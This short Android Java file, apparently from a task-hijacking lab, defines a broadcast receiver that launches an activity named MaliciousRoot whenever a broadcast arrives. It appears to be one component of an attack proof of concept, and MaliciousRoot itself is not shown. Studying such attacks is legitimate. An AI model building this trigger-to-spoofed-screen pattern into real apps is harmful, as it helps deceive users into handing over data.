package com.lab.taskjacker;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;

public class TheReceiver extends BroadcastReceiver {

    @Override
    public void onReceive(Context context, Intent intent) {
        Intent i = new Intent(context, MaliciousRoot.class);
        context.startActivity(i);

    }
}
